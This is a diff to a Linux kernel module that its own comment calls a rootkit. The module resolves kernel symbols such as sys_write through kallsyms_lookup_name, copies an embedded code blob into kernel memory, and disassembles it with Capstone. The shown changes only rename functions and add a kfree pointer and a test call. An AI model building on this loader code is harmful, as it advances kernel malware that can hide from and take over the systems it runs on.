@@ -29,7 +29,6 @@
 #include <linux/module.h>       /* Needed by all modules */
 #include <linux/kernel.h>       /* Needed for KERN_INFO */
 #include <linux/init.h>         /* Needed for the macros */
-#include <linux/tty.h>          /* For the tty declarations */
 #include <linux/version.h> /* For LINUX_VERSION_CODE */
 #include <linux/init.h>
 #include <linux/syscalls.h>
@@ -44,19 +43,29 @@
 #define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))
 
 /*
- * Declarations
+ * Kernel declarations.
  */
 extern int pinfo(const char *fmt, ...);
 extern int perr(const char *fmt, ...);
-//void *readfile(const char *file, size_t *len);
-int relocate(void *code, size_t code_len);
+extern void kernel_test(void);
 extern void * (*f_kmalloc)(size_t size, gfp_t flags);
+extern void (*f_kfree)(const void *);
 extern struct pid * (*f_find_vpid)(pid_t nr);
 extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
 extern int (*f_sys_write)(int fd, const char *mem, size_t len);
-extern struct tty_struct * (*f_get_current_tty)(void);
-extern char kernel_start, kernel_code_end, kernel_end;
-extern long syscall(long num, ...);
+
+/*
+ * Loader declarations.
+ */
+//void *readfile(const char *file, size_t *len);
+int disassemble(void *code, size_t code_len);
+
+/*
+ * Labels.
+ */
+extern void kernel_start(void);
+extern void kernel_code_end(void);
+extern void kernel_end(void);
 
 int init_module(void)
 {
@@ -78,6 +87,7 @@ int init_module(void)
      * Linux Kernel symbols for our rootkit.
 	 */
 	f_kmalloc = kmalloc;
+	f_kfree = kfree;
 	f_find_vpid = find_vpid;
 	f_vscnprintf = vscnprintf;
 	f_sys_write = kallsyms_lookup_name("sys_write");
@@ -98,9 +108,11 @@ int init_module(void)
 		memcpy(kernel_addr, &kernel_start, kernel_len);
 		pinfo("kernel is now copied to kernel_addr.\n");
 		
-		relocate(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
+		disassemble(kernel_addr, ((unsigned long)&kernel_code_end - (unsigned long)&kernel_start));
 
-		kfree(kernel_addr);
+		f_kfree(kernel_addr);
+
+		kernel_test();
 
 		return 0;
 	} else {
@@ -114,11 +126,11 @@ void cleanup_module(void)
 {
 }
 
-int relocate(void *code, size_t code_len) {
+int disassemble(void *code, size_t code_len) {
 	csh handle;
 	cs_insn *insn;
 	size_t count;
-	
+	size_t j, i;
 	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
 		perr("cs_open() error\n");
 		return -1;
@@ -129,10 +141,8 @@ int relocate(void *code, size_t code_len) {
 	count = cs_disasm(handle, code, code_len, (unsigned long)&kernel_start, 0, &insn);
 	pinfo("%d instructions disassembled.\n", count);
 	if (count > 0) {
-		size_t j;
 		for (j = 0; j < count; j++) {
 			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
-			size_t i;
 			for (i = 0; i< insn[j].size; i++) {
 				pinfo("%02x ", insn[j].bytes[i]);
 			}
